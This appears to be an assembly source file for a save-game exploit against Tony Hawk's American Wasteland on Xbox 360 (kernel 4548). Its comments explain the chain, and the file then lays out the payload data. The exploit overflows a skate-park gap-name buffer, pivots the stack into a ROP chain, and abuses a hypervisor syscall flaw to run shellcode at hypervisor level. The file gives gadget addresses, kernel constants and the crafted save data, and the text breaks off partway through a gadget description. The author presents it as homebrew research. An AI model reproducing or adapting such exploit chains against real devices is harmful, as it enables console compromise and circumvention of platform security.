# Description: Save game exploit for Tony Hawk's American Wasteland for Xbox 360 (NTSC)
# Author: Grimdoomer

###########################################################
# Save file constants
.set    GapDataStartFileOffset,         0xDF4       # Offset of the gap data in the save file
.set    GapDataStartHeapAddress,        0xB43B682E  # Address of the gap data on the heap
.set	OriginalStackPointer,			0x7004F2F0	# Stack pointer value upon exiting the load park function

###########################################################
# Kernel constants for 4548
.set    MmAllocatePhysicalMemoryEx,     0x8007CC18
.set    MmGetPhysicalAddress,           0x8007C9F8
.set	ObCreateSymbolicLink,			0x80088A08
.set    KernelSyscall,                  0x800747CC

.set    KernelAccessMaskAddress,        0x80176000  # Address of MmPhysical64KBMappingTable in the kernel
.set    HvSyscallTableAddress,          0xA0002100  # Address into the hv syscall table where we will write the jump address
.set    HvTargetJumpAddress,            0x00000350  # Address in the hv we will jump to
.set    HvSyscallNumber,                0x0000003F  # Syscall number we will call to execute the hack

###########################################################
# Tony Hawk gadget address.
.set    __restgprlr_27, 				0x82088D4C  # addi  r1, r1, 0x80, b __restgprlr_27
.set    __restgprlr_28, 				0x8208003C  # addi  r1, r1, 0x80, b __restgprlr_28
.set    __restgprlr_29, 				0x820807D0  # addi  r1, r1, 0x70, b __restgprlr_29
.set    stw_r28,        				0x82447828  # stw   r28, 0x14(r31), mtctr   r29, bctrl
.set	XamLoaderLaunchTitle,			0x824F6CA4	#

###########################################################
# ROP gadget addresses
.set    ROPGadget0,     0x822DC124  # Address of the first ROP gadget (see below)
.set    ROPGadget1,     0x8208C208  # Address of the second ROP gadget (see below)
.set    ROPGadget2,     MmAllocatePhysicalMemoryEx + 0x38
.set    ROPGadget3,     0x8218CE64
.set    ROPGadget4,     __restgprlr_29
.set    ROPGadget5,     0x82159884
.set    ROPGadget6,     MmGetPhysicalAddress + 0x14
.set    ROPGadget7,     0x8218CE64
.set    ROPGadget8,     __restgprlr_29
.set    ROPGadget9,     stw_r28
.set    ROPGadget10,    __restgprlr_28
.set    ROPGadget11,    stw_r28
.set    ROPGadget12,    __restgprlr_28
.set    ROPGadget13,    stw_r28
.set    ROPGadget14,    __restgprlr_27
.set    ROPGadget15,    0x824DB99C
.set    ROPGadget16,    0x824D8A60
.set    ROPGadget17,    0x82446840
.set    ROPGadget18,    KernelSyscall
.set	ROPGadget19,	0x824DB99C
.set	ROPGadget20,	stw_r28
.set	ROPGadget21,	__restgprlr_28
.set	ROPGadget22,	0x82159884
.set	ROPGadget23,	0x822DC124
.set	ROPGadget24,	0x824DB99C

.set PTE_VALID,				8
.set PTE_NO_EXECUTE,		4
.set PTE_DATA,				2
.set PTE_READ_ONLY,			1

#-------------------------------------------------------------------------------------------------------------------
#                                           Explanation of the hack
#-------------------------------------------------------------------------------------------------------------------
# This hack uses the same gap name buffer overflow that is present in most Tony Hawk games. On Xbox 360 however,
# there are mitigations in place that prevent us from easily getting our shell code to execute. I chained my Tony Hawk
# exploit together with the 4548 hypervisor syscall exploit on Xbox 360, in order to achieve full hypervisor code execution
# on the console. 
#
# The order of operations is similar to the other Tony Hawk exploits I developed for the original Xbox. The game features a
# built in editor that allows players to create their own skate parks. The function that loads the custom skate parks contains
# a stack buffer overflow that we can exploit by abusing a call to strcpy(). 
#
# We start by overflowig the gap name buffer that is stored on the stack. We overwrite the return address of the function 
# loading the save game file, with the address of a ROP gadget that will perform a stack pivot. The stack pivot will start 
# the execution of a ROP chain, which will take advantage of the hypervisor syscall handler exploit that is present in 
# the 4548 version hypervisor. This gets us hv level code execution and from there we can do whatever we want with the console.
#
# Right now this payload will only change the LED color to orange to demonstrate the hack. One day when I am not lazy
# I may get around to writing a real payload for this, but what is the point when this will never be used anyway...
#
# The order of operations is as follows:
#
#   1. The custom park file is loaded and the gap names are processed. We overflow the gap name buffer which is stored on
#       the stack and overwrite the return address of the function with a ROP gadget that will perform a stack pivot. Coming
#       out of the save game loading function we control registers r23 - r31, however, I was unable to find an easy gadget
#       that would allow me to change the stack pointer using one of those registers. 
#
#       To work around this I used the prolog of some function which loads a saved stack pointer off the stack and returns.
#       We simply place the address of our ROP chain data on the stack during the buffer overflow, we return to ROPGadget0
#       which performs the stack pivot, loads the next ROP gadget address, and returns to it. This kicks off the ROP chain.
#
#       Below is a diagram of the stack data for the save game loading function, and what we overwrite:
#
#       Stack layout:                           | After overflow:
#       ----------------------------------------|------------------------------------------------------
#       0x00 | ...                              | ...
#       0x7A | gap name buffer (40 characters)  | non-null characters (trash)
#       0xA4 | variable (DWORD)                 | non-null bytes (trash)
#       0xA8 | variable (DWORD)                 | non-null bytes (trash)
#       0xAC | padding (DWORD)                  | non-null bytes (trash)
#       0xB0 | variable (DWORD)                 | non-null bytes (trash)
#       0xB4 | padding (DWORD)                  | non-null bytes (trash)
#       0xB8 | padding (DWORD)                  | non-null bytes (trash)
#       0xBC | padding (DWORD)                  | non-null bytes (trash)
#       0xC0 | r23                              | 0x2323232323232323
#       0xC4 | r24                              | 0x2424242424242424
#       0xC8 | r25                              | 0x2525252525252525
#       0xD0 | r26                              | 0x2626262626262626
#       0xD4 | r27                              | 0x2727272727272727
#       0xD8 | r28                              | 0x2828282828282828
#       0xDC | r29                              | 0x2929292929292929
#       0xE0 | r30                              | 0x3030303030303030
#       0xE4 | r31                              | 0x3131313131313131
#       0xE8 | lr (return address)              | ROPGadget0 (address of the stack pivot ROP gadget)
#       0xEC | padding (DWORD)                  | 0xffffffff
#       0xF0 | padding (DWORD)                  | address of our ROP chain data stored in the save file (target stack pivot address)
#
#   2. After the stack pivot is complete we will fall into the ROP chain which is further down. The following steps
#       summarize what this ROP chain does:
#
#       2.1 Allocate some physical memory that we can use to store our shellcode in. We have to allocate physical memory
#           so that we can easily pass the address of the allocated buffer to the hypervisor and jump to it. 
#
#           The hypervisor does not understand how virtual memory allocated in usermode works, because virtual usermode 
#           memory uses a page table that only exists in usermode.
#
#       2.2 Save the address of the memory allocation and memcpy our shellcode into the buffer.
#
#       2.3 Call MmGetPhysicalAddress to get the physical address of our memory allocation. Even though we allocated
#           physical memory the address that was returned is virtual (because we are in usermode). The hypervisor will 
#           need the physical address in order to jump to the shellcode later on.
#
#       2.4 Save the physical allocation address into the stack frame for ROPGadget14, which will later be loaded into
#           the correct register (r4) when preparing for the hypervisor syscall.
#
#       2.5 Change the memory access mask in the kernel to map hypervisor memory into a usermode virtual address range.
#           Normally hypervisor memory is never mapped into usermode, but by changing this mask value we can force hv memory to
#           be mapped into the 0xA0000000 address range in usermode.
#
#           The hv pages that get mapped are still encrypted and hashed, so any writes to them will basically cause a fault 
#           if the hv tries to read from them normally. However, the hv syscall handler exploit allows us to read from this 
#           memory ignoring the encryption and hashing while also not cauing a fault. The exact details for this are explained 
#           below in step 3.
#
#       2.6 Now that hypervisor memory is mapped into usermode we overwrite an entry in the syscall table to point to a gadget
#           in the hv that will jump to the address contained in a register we control. When we execute the corresponding syscall, 
#           the syscall handler will read this value, ignoring the encryption and hashing that is used to protect hv memory,
#           and jump to this address.
#
#           The gadget we use will jump directly to the address contained in r4. Before executing the syscall we set r4 to the
#           64-bit physical address of our shellcode in memory.
#
#               mtctr       r4  # Move r4 into the count register
#               bctr            # Jump to the address in the count register
#
#       2.7 Setup necessary registers for syscall execution:
#               r0 = 0x200000000000003F     # syscall number (0x3F), with upper 32-bits set to trick the hv into ignoring encryption and hashing on memory access
#               r4 = 0x80000000xxxxxxxx     # 64-bit physicall adress of our shellcode, which the hv gadget will jump to
#
#       2.8 Execute the syscall instruction which transfers execution to the syscall handler in the hypervisor.
#
#   3. Once we execute the syscall instruction we switch into hypervisor mode and fall into the syscall handler.
#
#       3.1 Syscall handler performs some checks on the current thread context, and then starts to handle the syscall
#           being dispatched. It starts by checking that the syscall number passed in r0 is valid, however, the hv
#           only checks the lower 32-bits of r0, which allows us to control the upper 32-bits and still pass the range
#           check.
#
#               mtsprg0     r13                 # Save usermode thread context pointer
#               mfspr       r13, SPR_HSPRG0     # Get hypervisor thread context pointer
#               std         r1, 0x38(r13)
#               ...
#               cmplwi      r0, 0x64            # DWORD comparison of syscall number, (DWORD)r0 > 0 && (DWORD)r0 < 0x64
#               bge         _v_syscall_out_of_range     # If the syscall number is invalid fail out
#
#       3.2 Next the hv will do some more thread context stuff (not important to the hack), and use the syscall number to
#           index into the syscall table. When indexing it will multiply the syscall number in r0 by 4, but it treats r0
#           as a 64-bit integer. By setting the upper 32-bits of r0, we can have the hv read protected memory while ignoring
#           any encryption and hashing that is present for that page.
#
#           Earlier in the hack we overwrote the syscall table entry with the address of a hv gadget that would jump to the
#           address contained in r4 (which points to our shellcode). Normally a fault would be triggered whe the hv tries
#           to read this memory. But because we tricked the hv into reading the syscall entry address with the upper most bit
#           of the address set, the MMU will ignore any encryption and hashing that protects the hv page we are accessing.
#           This allows us to read the value we wrote here from usermode without triggering a fault.
#
#               ...
#               sldi        r1, r0, 2       # Shift r0 to the left by 2 (multiply by 4), 0x200000000000003F -> 0x80000000000000FC, upper most bit is now set
#               lwz         r4, 0x1F78(r1)  # Load the syscall entry address (overwrote with our gadget address in step 2.6), reading protected memory while ignoring any encryption and hashing
#               mtlr        r4              # Move the syscall address (gadget address) to the link register    
#               ld          r4, 0x48(r13)
#               mfspr       r1, SPR_HSPRG1
#               addi        r1, r1, 0x1F00  # Setup stack pointer for syscall execution
#               stdu        r2, -8(r1)
#               li          r2, 2
#               sldi        r2, r2, 32      # Setup HRMOR (hypervisor real mode offset register, similar to base pointer on x86)
#               blrl                        # Branch to link register (jumps to our gadget)
#
#       3.3 The hypervisor syscall handler jumps to our hv gadget which will jump to the address contained in r4 (our shellcode).
#
#               mtctr       r4  # Move r4 (address of our shellcode) into the count register
#               bctr            # Jump to our shellcode
#
#   4. The hypervisor executes our shellcode and we now have full hypervisor code execution on the console. This is where we
#       would normally patch out some auth checks in the hv so we can run our own unsigned code on the console, or, we
#       would do a soft reboot into a newer kernel that already has the auth checks patched out.
#
#       Since this kernel version is archaic in present day the shellcode will only change the ring of light LEDs to orange
#       to signal that the payload was executed.
#
#       There you have it, a console which hackers thought could not be defeated by a buffer overflow, being defeated by a
#       buffer overflow.    
#
#   Details for the ROP chain used in step 2:
#
#   Gadget 0: stack pivot
#
#       lwz         r1, 0(r1)           # Perform the stack pivot (r1 = stack_data + 8)
#       lwz         r12, -8(r1)         # Load next gadget address
#       mtlr        r12
#       blr
#
#   Gadget 1: Setup registers for MmAllocatePhysicalMemoryEx
#       addi        r1, r1, 0xA0
#       b           __restgprlr_24
#           ld          r24, -0x48(r1)
#           ld          r25, -0x40(r1)  # r25 -> r5 (access mask) = PAGE_READWRITE | PAGE_NOCACHE
#           ld          r26, -0x38(r1)
#           ld          r27, -0x30(r1)  # r27 -> r4 (dwSize) = 0x10000
#           ld          r28, -0x28(r1)  # r28 -> r8 = NULL
#           ld          r29, -0x20(r1)  # r29 -> r7 (ulPhysicalAddress) = -1
#           ld          r30, -0x18(r1)  # r30 -> r6 = NULL
#           ld          r31, -0x10(r1)  # r31 -> r3 (dwRegion) = NULL
#           lwz         r12, -0x8(r1)   # lr = pointer to the next ROP gadget (ROPGadget2)
#           mtlr        r12
#           blr
#
#   Gadget 2: MmAllocatePhysicalMemoryEx
#
#       Note: We skip the epilog of MmAllocatePhysicalMemoryEx which would normally move the arguments in
#       registers (r3...r8) into registers (r31...r25) since we already did this in the previous ROP gadget. 
#       This also skips the stack prolog which would break the ROP chain.
#
#       cmplwi      cr6, r28, 0
#       bne         cr6, loc_80096A94
#       ...
#       addi        r1, r1, 0x180
#       b           __restgprlr_14
#           ld          r14, -0x98(r1)
#           ld          r15, -0x90(r1)
#           ld          r16, -0x88(r1)
#           ld          r17, -0x80(r1)
#           ld          r18, -0x78(r1)
#           ld          r19, -0x70(r1)
#           ld          r20, -0x68(r1)
#           ld          r21, -0x60(r1)
#           ld          r22, -0x58(r1)
#           ld          r23, -0x50(r1)
#           ld          r24, -0x48(r1)
#           ld          r25, -0x40(r1)
#           ld          r26, -0x38(r1)
#           ld          r27, -0x30(r1)
#           ld          r28, -0x28(r1)
#           ld          r29, -0x20(r1)  # r29 = pointer to ROP gadget ROPGadget4
#           ld          r30, -0x18(r1)
#           ld          r31, -0x10(r1)
#           lwz         r12, -0x8(r1)   # lr = pointer to the next ROP gadget (ROPGadget3)
#           mtlr        r12
#           blr
#
#   Gadget 3: save shell code address
#
#       mr          r28, r3             # Save allocation address from MmAllocatePhysicalMemoryEx
#       lwz         r11, 0x4C54(r29)    # Next gadget address (ROPGadget4)
#       mtctr       r11
#       bctrl
#
#   Gadget 4: setup for shell code memcpy
#
#       addi        r1, r1, 0x70
#       b           __restgprlr_29
#           ld          r29, -0x20(r1)  # r29 = size of (shell code / 4)
#           ld          r30, -0x18(r1)
#           ld          r31, -0x10(r1)  # r31 = address of shellcode in the save file
#           lwz         r12, -0x8(r1)   # lr = pointer to the next ROP gadget (ROPGadget5)
#           mtlr        r12
#           blr
#
#   Gadget 5: memcpy - copy shell code to our payload buffer
#
#       slwi        r5, r29, 2          # Size of the copy (PAGE_SIZE)
#       lwz         r4, 0x10(r31)       # Address of our shell code below
#       mr          r3, r28             # Allocation address from MmAllocatePhysicalMemoryEx
#       bl          memcpy
#       addi        r1, r1, 0x80
#       b           __restgprlr_28
#           ld          r28, -0x28(r1)
#           ld          r29, -0x20(r1)  # Pointer to the address of ROPGadget8 (used by ROPGadget7)
#           ld          r30, -0x18(r1)
#           ld          r31, -0x10(r1)
#           lwz         r12, -0x8(r1)   # lr = pointer to the next ROP gadget (ROPGadget6)
#           mtlr        r12
#           blr
#
#   Gadget 6: MmGetPhysicalAddress - get the physical address of our shell code buffer
#
#       Normally we would need another gadget to reload the payload address that
#       we pass to MmGetPhysicalAddress but memcpy is nice enough to return it to us.
#
#       Additionally we skip the epilog of the function similarly to MmAllocatePhysicalMemoryEx.
#
#       lis         r11, 0x7FFF # 0x7FFFFFFF
#       mr          r31, r3             # Allocation address returned by memcpy (shellcode address)
#       ...
#       addi        r1, r1, 0x70
#       lwz         r12, -8(r1)         # lr = pointer to the next ROP gadget (ROPGadget7)
#       mtlr        r12
#       ld          r30, -0x18(r1)
#       ld          r31, -0x10(r1)
#       blr
#
#   Gadget 7: save shell code address part 1
#
#       mr          r28, r3             # move return value from MmGetPhysicalAddress
#       lwz         r11, 0x4C54(r29)    # load next gadget address (ROPGadget8)
#       mtctr       r11
#       bctrl
#
#   Gadget 8: save shell code address part 2
#
#       addi        r1, r1, 0x70
#       b           __restgprlr_29
#           ld          r29, -0x20(r1)  # r29 = address of ROPGadget10
#           ld          r30, -0x18(r1)
#           ld          r31, -0x10(r1)  # r31 = pointer to save shell code address to (stack data for gadget 14)
#           lwz         r12, -0x8(r1)
#           mtlr        r12
#           blr
#
#   Gadget 9: save shell code address part 3
#
#       stw         r28, 0x14(r31)      # store physical address of shell code to stack data for gadget 14
#       mtctr       r29                 # address of next ROP gadget (ROPGadget10)
#       bctrl
#
#   Gadget 10: setup registers for next gadget
#
#       addi        r1, r1, 0x80
#       b           __restgprlr_28
#           ld          r28, -0x28(r1)  # r28 = new memory access mask (will cause hv to be mapped into usermode)
#           ld          r29, -0x20(r1)  # r29 = addres of ROPGadget12 (used by ROPGadget11)
#           ld          r30, -0x18(r1)
#           ld          r31, -0x10(r1)  # r31 = kernel address to write new memory access mask to
#           lwz         r12, -0x8(r1)   # lr = pointer to the next ROP gadget (ROPGadget11) 
#           mtlr        r12
#           blr
#
#   Gadget 11: change kernel memory access mask
#
#       stw         r28, 0x14(r31)      # Write new memory access mask to kernel, which will cause hv to be mapped into usermode
#       mtctr       r29                 # address of next ROP gadget (ROPGadget12)
#       bctrl
#
#   Gadget 12: setup registers for next gadget
#
#       addi        r1, r1, 0x80
#       b           __restgprlr_28
#           ld          r28, -0x28(r1)  # r28 = target jump address in hv (used to overwrite syscall table entry)
#           ld          r29, -0x20(r1)  # r29 = address of ROPGadget14
#           ld          r30, -0x18(r1)
#           ld          r31, -0x10(r1)  # r30 = address into hv syscall which we will overwrite
#           lwz         r12, -0x8(r1)   # lr = pointer to the next ROP gadget (ROPGadget13)
#           mtlr        r12
#           blr
#
#   Gadget 13: Write target hypervisor jump address
#
#       stw         r28, 0x14(r31)      # Overwrite entry in hv syscall table with our target jump address
#       mtctr       r29                 # address of next ROP gadget (ROPGadget14)  
#       bctrl
#
#   Gadget 14: setup registers for next gadget
#
#       addi        r1, r1, 0x80
#       b           __restgprlr_27
#           ld          r27, -0x30(r1)
#           ld          r28, -0x28(r1)  # r28 -> r5 = syscall number
#           ld          r29, -0x20(r1)  # r29 -> r4 = address of junk data for ROPGadget16
#           ld          r30, -0x18(r1)  # r30 -> r3 = address of junk data for ROPGadget16
#           ld          r31, -0x10(r1)  # r31 = address of ROPGadget16
#           lwz         r12, -0x8(r1)   # lr = pointer to the next ROP gadget (ROPGadget15)
#           mtlr        r12
#           blr
#
#   Gadget 15: move registers for next gadget
#
#   This gadget is beautiful in so many ways <3
#
#       mr          r6, r27             # physical address of the shellcode, will later be moved into r4 (the hv code we jump to will eventually jump to the address in r4)
#       mr          r5, r28             # target syscall number which will get moved into r0
#       mr          r4, r29             # address to junk data for next gadget
#       mr          r3, r30             # address to junk data for next gadget
#       mtctr       r31
#       bctrl                           # execute next gadget
#
#       Gadget 16: setup for syscall part 1
#
#           mr.         r0, r5              # move target syscall number
#           mtctr       r5
#           ble         ...
#           lbz         r8, 0(r3)           # load junk data
#           lbz         r7, 0(r4)           # load junk data
#           mr          r10, r3
#           cmpwi       cr1, r8, 0          # check if junk data is NULL (it is)
#           bdnzf       ...                 # if junk data is not NULL, loop
#           blr                             # return back to gadget 15 for prolog
#
#   Gadget 15 prolog:
#       b           loc_824DB9BC
#       ...
#
#       loc_824DB9BC:
#       addi        r1, r1, 0x90        # prolog: prepare for next gadget
#       b           __restgprlr_26
#           ld          r26, -0x38(r1)
#           ld          r27, -0x30(r1)  # r27 = 64-bit physical address of our shellcode in memory (saved here in ROPGadget5)
#           ld          r28, -0x28(r1)  # r28 = pointer to ROPGadget18 (to be used by ROPGadget17)
#           ld          r29, -0x20(r1)
#           ld          r30, -0x18(r1)
#           ld          r31, -0x10(r1)
#           lwz         r12, -0x8(r1)   # lr = pointer to the next ROP gadget (ROPGadget17)
#           mtlr        r12
#           blr
#
#   Gadget 17: setup for syscall part 2
#
#       mr          r4, r27             # move 64bit physcial address of shellcode (hv will jump to this during syscall execution)
#       lwz         r11, 8(r28)         # load address of next gadget
#       mtctr       r11
#       bctrl                           # jump to next gadget
#
#   Gadget 18: syscall
#       sc          # execute syscall which will cause the hypervisor to jump to our shellcode
#       blr
#
#-------------------------------------------------------------------------------------------------------------------

#---------------------------------------------------------
# Gap name stack overflow
#---------------------------------------------------------
.long       GapDataStartFileOffset
.long       (_gap_data_end - _gap_data_start)

_gap_data_start:

        # +0 Start of gap 1 struct.
        .byte   0x08, 0x08, 0x1F, 0x1D
        .byte   0x00, 0x00, 0x31, 0x00

        # +8 Fill the gap name buffer with crap data.
        .byte   "Grim R0x T0ny H4wk's S0x!"
_1:     .fill   70 - (_1 - _gap_data_start) - 2, 1, 0x69

        # +78 new register values for function prolog
        .long   0x23232323, 0x23232323  # r23
        .long   0x24242424, 0x24242424  # r24
        .long   0x25252525, 0x25252525  # r25
        .long   0x26262626, 0x26262626  # r26
        .long   0x27272727, 0x27272727  # r27
        .long   0x28282828, 0x28282828  # r28
        .long   0x29292929, 0x29292929  # r29
        .long   0x30303030, 0x30303030  # r30
        .long   0x31313131, 0x31313131  # r31
        .long   ROPGadget0              # lr
        .long   0xffffffff              #
        .long   GapDataStartHeapAddress + (stack_data - _gap_data_start) + 8    # Target stack pivot address
        
        # null terminator
        .byte   0
        .align  4
        
stack_data:
        ###########################################################
        # Gadget 0: stack pivot
        #
        # lwz       r1, 0(r1)           # Perform the stack pivot (r1 = stack_data + 8)
        # lwz       r12, -8(r1)         # Load next gadget address
        # mtlr      r12
        # blr
        ###########################################################
        .long   ROPGadget1              # r12 - address of the next ROP gadget
        .long   0x00
        
        ###########################################################
        # Gadget 1: Setup registers for MmAllocatePhysicalMemoryEx
        #
        # addi      r1, r1, 0xA0
        # b         __restgprlr_24
        ###########################################################     
        .fill   0x58, 1, 0x00
        .long   0x24242424, 0x24242424  # r24
        .long   0x00000000, 0x00000204  # r25 - r5 = access mask = PAGE_READWRITE | PAGE_NOCACHE
        .long   0x26262626, 0x26262626  # r26
        .long   0x00000000, 0x00010000  # r27 - r4 = size = 0x10000
        .long   0x00000000, 0x00000000  # r28 - r8 = NULL
        .long   0x00000000, 0xffffffff  # r29 - r7 = -1
        .long   0x00000000, 0x00000000  # r30 - r6 = NULL
        .long   0x00000000, 0x00000000  # r31 - r3 = NULL
        .long   ROPGadget2              # lr - MmAllocatePhysicalMemoryEx
        .long   0x00                    #
        
        ###########################################################
        # Gadget 2: MmAllocatePhysicalMemoryEx
        #
        # ...
        # addi      r1, r1, 0x180
        # b         __restgprlr_14
        ###########################################################
        .fill   0xE8, 1, 0x00
        .long   0x14141414, 0x14141414  # r14
        .long   0x15151515, 0x15151515  # r15
        .long   0x16161616, 0x16161616  # r16
        .long   0x17171717, 0x17171717  # r17
        .long   0x18181818, 0x18181818  # r18
        .long   0x19191919, 0x19191919  # r19
        .long   0x20202020, 0x20202020  # r20
        .long   0x21212121, 0x21212121  # r21
        .long   0x22222222, 0x22222222  # r22
        .long   0x23232323, 0x23232323  # r23
        .long   0x24242424, 0x24242424  # r24
        .long   0x25252525, 0x25252525  # r25
        .long   0x26262626, 0x26262626  # r26
        .long   0x27272727, 0x27272727  # r27
        .long   0x28282828, 0x28282828  # r28
        .long   0x00000000, GapDataStartHeapAddress + (_2 - _gap_data_start) - 0x4C54   # r29 - pointer to the next gadget address
        .long   0x30303030, 0x30303030  # r30
        .long   0x31313131, 0x31313131  # r31
        .long   ROPGadget3              # lr - next gadget address
_2:     .long   ROPGadget4              # next next gadget address
        
        ###########################################################
        # Gadget 3: save shell code address
        #
        # mr        r28, r3             # Address from MmAllocatePhysicalMemoryEx
        # lwz       r11, 0x4C54(r29)    # Next gadget address (ROPGadget4)
        # mtctr     r11
        # bctrl
        ###########################################################
        
        ###########################################################
        # Gadget 4: setup for shell code memcpy
        #
        # addi      r1, r1, 0x70
        # b         __restgprlr_29
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, 0x00004000  # r29 - size of (shell code / 4), we just use (PAGE_SIZE / 4) here
        .long   0x30303030, 0x30303030  # r30
        .long   0x00000000, GapDataStartHeapAddress + (_3 - _gap_data_start) - 0x10 # r31 - pointer to shell code address
        .long   ROPGadget5              # lr
_3:     .long   GapDataStartHeapAddress + (_shell_code_start - _gap_data_start)     # shell code address
        
        ###########################################################
        # Gadget 5: memcpy - copy shell code to our payload buffer
        #
        # slwi      r5, r29, 2          # Size of the copy (PAGE_SIZE)
        # lwz       r4, 0x10(r31)       # Address of our shell code below
        # mr        r3, r28
        # bl        memcpy
        # addi      r1, r1, 0x80
        # b         __restgprlr_28
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x28282828, 0x28282828  # r28
        .long   0x00000000, GapDataStartHeapAddress + (_4 - _gap_data_start) - 0x4C54   # r29 - pointer to next gadget address for gadget 7
        .long   0x30303030, 0x30303030  # r30
        .long   0x31313131, 0x31313131  # r31
        .long   ROPGadget6              # lr - next gadget address
_4:     .long   ROPGadget8              # next gadget address for gadget 7
        
        ###########################################################
        # Gadget 6: MmGetPhysicalAddress - get the physical address of our shell code buffer
        #
        # Normally we would need another gadget to reload the payload address that
        # we pass to MmGetPhysicalAddress but memcpy is nice enough to return it to use.
        #
        # ...
        # addi      r1, r1, 0x70
        # lwz       r12, -8(r1)         # next gadget address (ROPGadget7)
        # mtlr      r12
        # ld        r30, -0x18(r1)
        # ld        r31, -0x10(r1)
        # blr
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x30303030, 0x30303030  # r30
        .long   0x31313131, 0x31313131  # r31
        .long   ROPGadget7              # lr - next gadget address
        .long   0x00000000              #
        
        ###########################################################
        # Gadget 7: save shell code address part 1
        #
        # mr        r28, r3             # move return value from MmGetPhysicalAddress
        # lwz       r11, 0x4C54(r29)    # load next gadget address
        # mtctr     r11
        # bctrl
        ###########################################################
        
        ###########################################################
        # Gadget 8: save shell code address part 2
        #
        # addi      r1, r1, 0x70
        # b         __restgprlr_29
        ###########################################################
        .fill   0x50, 1, 0x00
        .long   0x00000000, ROPGadget10 # r29 - next next gadget address
        .long   0x30303030, 0x30303030  # r30
        .long   0x00000000, GapDataStartHeapAddress + (_6 - _gap_data_start) + 4 - 0x14 # r31 - pointer to save shell code address to (stack data for gadget 14)
        .long   ROPGadget9              # lr - next gadget address
        .long   0x00000000      
        
        ###########################################################
        # Gadget 9: save shell code address part 3
        #
        # stw       r28, 0x14(r31)      # store physical address of shell code to stack data for gadget 14
        # mtctr     r29                 # next gadget address
        # bctrl
        ###########################################################
        
        ###########################################################
        # Gadget 10: setup registers for next gadget
        #
        # addi      r1, r1, 0x80
        # b         __restgprlr_28
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x00000000, 0x66666666  # r28 - value to store (new memory access mask)
        .long   0x00000000, ROPGadget12 # r29 - next next gadget address
        .long   0x30303030, 0x30303030  # r30
        .long   0x00000000, KernelAccessMaskAddress - 0x14  # r31 - address to store value at
        .long   ROPGadget11             # lr - next gadget address
        .long   0x00000000              #
        
        ###########################################################
        # Gadget 11: change kernel memory access mask
        #
        # stw       r28, 0x14(r31)
        # mtctr     r29
        # bctrl
        ###########################################################
        
        ###########################################################
        # Gadget 12: setup registers for next gadget
        #
        # addi      r1, r1, 0x80
        # b         __restgprlr_28
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x00000000, HvTargetJumpAddress     # r28 - value to store (address to jump to in hv)
        .long   0x00000000, ROPGadget14 # r29 - next next gadget address
        .long   0x30303030, 0x30303030  # r30
        .long   0x00000000, HvSyscallTableAddress - 0x14    # r31 - address to store value at
        .long   ROPGadget13             # lr - next gadget address
        .long   0x00000000              #
        
        ###########################################################
        # Gadget 13: Write target hypervisor jump address
        #
        # stw       r28, 0x14(r31)
        # mtctr     r29
        # bctrl
        ###########################################################
        
        ###########################################################
        # Gadget 14: setup registers for next gadget
        #
        # addi      r1, r1, 0x80
        # b         __restgprlr_27
        ###########################################################
        .fill   0x48, 1, 0x00
_5:     .long   0x00000000, 0x00000000  # Junk data for the next gadget to work with
        .long   0x00000000, 0x00000000  # r27
        .long   0x20000000, HvSyscallNumber     # r28 - r5 for next gadget: target syscall number
        .long   0x00000000, GapDataStartHeapAddress + (_5 - _gap_data_start)        # r29 - r4 for next gadget: address of junk data
        .long   0x00000000, GapDataStartHeapAddress + (_5 - _gap_data_start)        # r30 - r3 for next gadget: address of junk data
        .long   0x00000000, ROPGadget16 # r31 - next next gadget address
        .long   ROPGadget15             # lr - next gadget address
        .long   0x00000000              #
        
        ###########################################################
        # Gadget 15: move registers for next gadget
        #
        # This gadget is beautiful in so many ways <3
        #
        # mr        r6, r27             # physical address of the shellcode, will later be moved into r4 (r4 because the hv code we jump to move r4 to the ctr and jump to it)
        # mr        r5, r28             # target syscall number which will get moved into r0
        # mr        r4, r29             # address to junk data for next gadget
        # mr        r3, r30             # address to junk data for next gadget
        # mtctr     r31
        # bctrl                         # execute next gadget
        # b         ...
        # ...
        # addi      r1, r1, 0x90        # prolog: prepare for next gadget
        # b         __restgprlr_26
        ###########################################################
        .fill   0x58, 1, 0x00
        .long   0x26262626, 0x26262626  # r26
_6:     .long   0x80000000, 0x00000000  # r27 - Shellcode address to jump to (was saved here from gadget 9)
        .long   0x00000000, GapDataStartHeapAddress + (_7 - _gap_data_start) - 8    # r28 - pointer to next gadget address
        .long   0x29292929, 0x29292929  # r29
        .long   0x30303030, 0x30303030  # r30
        .long   0x31313131, 0x31313131  # r31
        .long   ROPGadget17             # lr - next gadget address
_7:     .long   ROPGadget18
        
        ###########################################################
        # Gadget 16: setup for syscall part 1
        #
        # mr.       r0, r5              # move target syscall number
        # mtctr     r5
        # ble       ...
        # lbz       r8, 0(r3)           # load junk data
        # lbz       r7, 0(r4)           # load junk data
        # mr        r10, r3
        # cmpwi     cr1, r8, 0          # check junk data, if it is 0 return
        # bdnzf     ...
        # blr                           # return back to gadget 15 for prolog
        ###########################################################
        
        ###########################################################
        # Gadget 17: setup for syscall part 2
        #
        # mr        r4, r27             # move 64bit physcial address of shellcode
        # lwz       r11, 8(r28)         # load address of next gadget
        # mtctr     r11
        # bctrl                         # jump to next gadget
		# 
		# mr.		r26, r3
		# beq		...
		# ...
		# mr        r3, r26
		# addi      r1, r1, 0x90		# prolog: prepare for next gadget
		# b         __restgprlr_25
        ###########################################################
		.fill   0x50, 1, 0x00
		.long	0x25252525, 0x25252525	# r25
		.long	0x26262626, 0x26262626	# r26
		.long	0x27272727, 0x27272727	# r27
		.long	0x28282828, 0x28282828	# r28
		.long	0x00000000, GapDataStartHeapAddress + (hdd_symlink_path - _gap_data_start)	# r29 - address of the file path to link
		.long	0x00000000, GapDataStartHeapAddress + (hdd_symlink_mount - _gap_data_start)	# r30 - address of the mount path to link to
		.long	0x00000000, ObCreateSymbolicLink	# r31 - function to call = ObCreateSymbolicLink
		.long	ROPGadget19				# lr - next gadget address
		.long   0x00000000              #
        
        ###########################################################
        # Gadget 18: syscall
        #
        # sc        # execute syscall which will cause the hypervisor to jump to our shellcode
        # blr
        ###########################################################
		
		###########################################################
        # Gadget 19: create a symbolic link for the hdd content folder
        #
        # mr        r6, r27             # 
        # mr        r5, r28             # 
        # mr        r4, r29             # hdd_symlink_path_str
        # mr        r3, r30             # hdd_symlink_mount_str
        # mtctr     r31
